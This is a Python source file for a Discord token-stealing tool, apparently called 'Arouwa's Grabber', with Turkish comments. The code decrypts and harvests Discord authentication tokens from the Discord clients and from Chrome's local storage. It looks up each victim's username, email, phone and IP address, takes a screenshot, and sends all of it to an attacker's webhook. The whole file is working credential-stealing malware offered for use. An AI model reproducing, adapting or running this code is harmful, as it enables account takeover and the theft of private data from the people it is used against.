import base64
import json
import os
import re
import requests
import pyautogui
from Cryptodome.Cipher import AES
from win32crypt import CryptUnprotectData
from io import BytesIO
from PIL import Image

class Discord:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens_sent = []
        self.tokens = []
        self.ids = []

        self.grabTokens()
        self.send_user_data_to_webhook("Webhook_url_here")

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return "Failed to decrypt password"

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        master_key = master_key[5:]
        master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue
            disc = name.replace(" ", "").lower()
            if "cord" in path:
                if os.path.exists(self.roaming + f'\\{disc}\\Local State'):
                    for file_name in os.listdir(path):
                        if file_name[-3:] not in ["log", "ldb"]:
                            continue
                        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                            for y in re.findall(self.encrypted_regex, line):
                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                r = requests.get(self.baseurl, headers={
                                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                    'Content-Type': 'application/json',
                                    'Authorization': token})
                                if r.status_code == 200:
                                    uid = r.json()['id']
                                    if uid not in self.ids:
                                        self.tokens.append(token)
                                        self.ids.append(uid)
            else:
                for file_name in os.listdir(path):
                    if file_name[-3:] not in ["log", "ldb"]:
                        continue
                    for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for token in re.findall(self.regex, line):
                            r = requests.get(self.baseurl, headers={
                                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                                'Content-Type': 'application/json',
                                'Authorization': token})
                            if r.status_code == 200:
                                uid = r.json()['id']
                                if uid not in self.ids:
                                    self.tokens.append(token)
                                    self.ids.append(uid)

    def get_ip_and_country(self):
        # IP ve ülke bilgisini almak için ipinfo.io API'sini kullanıyoruz
        ip_info_url = "https://ipinfo.io/json"
        response = requests.get(ip_info_url)
        if response.status_code == 200:
            data = response.json()
            ip = data.get("ip", "Not available")
            country = data.get("country", "Not available")
            return ip, country
        else:
            return "Unknown", "Unknown"

    def take_screenshot(self):
        # Ekran görüntüsünü almak ve dosyaya kaydetmek
        screenshot = pyautogui.screenshot()
        screenshot_path = "screenshot.png"
        screenshot.save(screenshot_path)
        return screenshot_path

    def send_user_data_to_webhook(self, webhook_url):
        profile_picture_url = "https://media.discordapp.net/attachments/1304737290505027630/1304791771389235212/arouwa.png?ex=6730ad88&is=672f5c08&hm=2af81713d5725cb77fd788fd4b74b2119fbe5fd5963bbe6c2e3e07f44c7f9874&=&format=webp&quality=lossless&width=640&height=640"
        
        for token in self.tokens:
            headers = {'Authorization': token}
            response = requests.get(self.baseurl, headers=headers)
            if response.status_code == 200:
                user_data = response.json()
                username = user_data.get('username', 'Unknown')
                user_id = user_data.get('id', 'Unknown')
                email = user_data.get('email', 'Not available')
                phone = user_data.get('phone', 'Not available')
                
                # IP ve ülke bilgisi alınır
                ip, country = self.get_ip_and_country()

                # Ekran görüntüsü alınır
                screenshot_path = self.take_screenshot()

                # Webhook'a gönderilecek veri
                data = {
                    "username": "Arouwa's Grabber",
                    "avatar_url": profile_picture_url,
                    "embeds": [
                        {
                            "title": "Victim's Grabbed Data | Made By Arouwa",
                            "color": 16711680,  # Kırmızı renk
                            "fields": [
                                {"name": "Username", "value": username, "inline": False},
                                {"name": "ID", "value": user_id, "inline": False},
                                {"name": "Email", "value": email, "inline": False},
                                {"name": "Phone", "value": phone, "inline": False},
                                {"name": "IP", "value": ip, "inline": False},
                                {"name": "Country", "value": country, "inline": False},
                                {"name": "Token", "value": token, "inline": False}
                            ]
                        }
                    ]
                }

                # `data` JSON verisini text olarak ve `files`'ı aynı anda gönderiyoruz
                with open(screenshot_path, 'rb') as screenshot_file:
                    files = {
                        'file': (screenshot_path, screenshot_file, 'image/png')
                    }
                    # Veriyi text formatında JSON olarak gönderiyoruz
                    webhook_response = requests.post(webhook_url, data={'payload_json': json.dumps(data)}, files=files)
                    if webhook_response.status_code == 204:
                        print(f"Message sent successfully for {username}")
                    else:
                        print(f"Failed to send message: {webhook_response.status_code}")
            else:
                print(f"Failed to fetch user data: {response.status_code}")

if __name__ == "__main__":
    discord = Discord()
